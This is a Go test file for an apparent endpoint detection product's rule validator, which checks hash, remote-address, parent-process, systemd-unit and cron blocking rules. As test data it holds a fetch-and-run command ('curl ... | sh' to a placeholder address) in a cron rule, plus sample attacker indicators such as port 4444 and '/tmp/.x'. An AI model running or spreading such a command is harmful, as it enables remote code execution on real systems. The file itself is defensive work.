package rules

import (
	"net/netip"
	"strings"
	"testing"

	"xdr/internal/baseline"
)

func TestValidate(t *testing.T) {
	const base = "cd34000000000000000000000000000000000000000000000000000000000000"
	g := Guard{
		Baseline:  func(s string) bool { return s == base },
		GuardExes: []string{"/usr/sbin/mysqld"},
		Protect:   []netip.Prefix{netip.MustParsePrefix("192.0.2.0/24")},
	}
	remote := func(addr string, port uint16) Rule {
		return Rule{Kind: "remote", Addr: netip.MustParseAddr(addr), Port: port, Proto: "tcp"}
	}
	for _, c := range []struct {
		name string
		r    Rule
		want string // "" accepted
	}{
		{"hash", Rule{Kind: "hash", SHA256: sum, Exe: "/tmp/.x"}, ""},
		{"remote", remote("203.0.113.9", 4444), ""},
		{"udp remote", Rule{Kind: "remote", Addr: netip.MustParseAddr("2001:db8::9"), Port: 53, Proto: "udp"}, ""},
		{"baseline", Rule{Kind: "hash", SHA256: base, Exe: "/tmp/sh"}, "baseline hash"},
		{"guarded", Rule{Kind: "hash", SHA256: sum, Exe: "/usr/sbin/mysqld"}, "guarded exe"},
		{"upper hash", Rule{Kind: "hash", SHA256: strings.ToUpper(sum)}, "bad hash"},
		{"short hash", Rule{Kind: "hash", SHA256: "ab12"}, "bad hash"},
		{"protected", remote("192.0.2.7", 443), "protected address"},
		{"protected mapped", remote("::ffff:192.0.2.7", 443), "protected address"},
		{"loopback", remote("127.0.0.1", 1), "not a unicast address"},
		{"link-local", remote("fe80::1", 1), "not a unicast address"},
		{"multicast", remote("224.0.0.1", 1), "not a unicast address"},
		{"broadcast", remote("255.255.255.255", 1), "not a unicast address"},
		{"unspecified", remote("0.0.0.0", 1), "not a unicast address"},
		{"no addr", Rule{Kind: "remote", Port: 1, Proto: "tcp"}, "not a unicast address"},
		{"port 0", remote("203.0.113.9", 0), "no port"},
		{"proto", Rule{Kind: "remote", Addr: netip.MustParseAddr("203.0.113.9"), Port: 1, Proto: "icmp"}, "bad proto"},
		{"kind", Rule{Kind: "parent-child"}, "unknown kind"},
	} {
		err := g.Validate(c.r)
		switch {
		case c.want == "" && err != nil:
			t.Errorf("%s: %v", c.name, err)
		case c.want != "" && (err == nil || !strings.Contains(err.Error(), c.want)):
			t.Errorf("%s: got %v, want %q", c.name, err, c.want)
		}
	}
}

func TestBaselineHashes(t *testing.T) {
	b := &baseline.Baseline{Files: map[string]baseline.FileEntry{"/usr/bin/sh": {SHA256: sum}, "/etc": {}}}
	in := BaselineHashes(b)
	if !in(sum) || in("") || in("ffff") {
		t.Fatal("wrong set")
	}
	if BaselineHashes(nil)(sum) {
		t.Fatal("nil baseline matched")
	}
}

func TestValidate_NewKinds(t *testing.T) {
	const base = "cd34000000000000000000000000000000000000000000000000000000000000"
	const cmd = "curl -s http://203.0.113.9/x | sh"
	g := Guard{
		Baseline:  func(s string) bool { return s == base },
		GuardExes: []string{"/usr/sbin/apache2"},
		StockCron: func(c string) bool { return c == "run-parts /etc/cron.daily" },
	}
	long := "/" + strings.Repeat("a", 512)
	parent := func(p, c string) Rule { return Rule{Kind: "parent", ParentExe: p, Exe: c} }
	unit := func(n, s string) Rule { return Rule{Kind: "unit", Unit: n, SHA256: s} }
	for _, c := range []struct {
		name string
		r    Rule
		want string
	}{
		{"parent", parent("/usr/sbin/apache2", "/usr/bin/dash"), ""},
		{"parent interp", parent("/opt/app/srv", "/usr/bin/python3.12"), ""},
		{"child not shell", parent("/usr/sbin/apache2", "/usr/sbin/apache2"), "child is not a shell"},
		{"relative", parent("relative", "/bin/sh"), "not an absolute path"},
		{"relative child", parent("/opt/app/srv", "sh"), "not an absolute path"},
		{"long", parent(long, "/bin/sh"), "path too long"},
		{"unit", unit("evil.service", sum), ""},
		{"unit timer", unit("x@1.timer", sum), ""},
		{"unit baseline", unit("evil.service", base), "baseline hash"},
		{"unit bad hash", unit("evil.service", "ab"), "bad hash"},
		{"unit dots", unit("../x.service", sum), "bad unit name"},
		{"unit slash", unit("a/x.service", sum), "bad unit name"},
		{"unit no suffix", unit("evil", sum), "bad unit name"},
		{"cron", Rule{Kind: "cron", Command: cmd}, ""},
		{"cron empty", Rule{Kind: "cron"}, "no command"},
		{"cron long", Rule{Kind: "cron", Command: strings.Repeat("a", 513)}, "command too long"},
		{"cron stock", Rule{Kind: "cron", Command: "run-parts /etc/cron.daily"}, "stock cron"},
	} {
		err := g.Validate(c.r)
		switch {
		case c.want == "" && err != nil:
			t.Errorf("%s: %v", c.name, err)
		case c.want != "" && (err == nil || !strings.Contains(err.Error(), c.want)):
			t.Errorf("%s: got %v, want %q", c.name, err, c.want)
		}
	}
}

// A parent rule naming what starts sessions or runs scripts would kill
// every login or script fleet-wide.
func TestValidate_ParentLaunchers(t *testing.T) {
	for _, p := range []string{
		"/usr/lib/systemd/systemd", "/sbin/init", "/usr/sbin/sshd", "/usr/lib/openssh/sshd-session",
		"/usr/sbin/cron", "/usr/sbin/atd", "/usr/bin/login", "/usr/bin/sudo", "/usr/bin/su",
		"/usr/bin/tmux", "/usr/bin/screen", "/usr/bin/containerd-shim-runc-v2",
		"/usr/bin/bash", "/usr/bin/python3.12", "/usr/bin/perl",
	} {
		err := Guard{}.Validate(Rule{Kind: "parent", ParentExe: p, Exe: "/bin/sh"})
		if err == nil || !strings.Contains(err.Error(), "launcher parent") {
			t.Errorf("%s: %v", p, err)
		}
	}
}
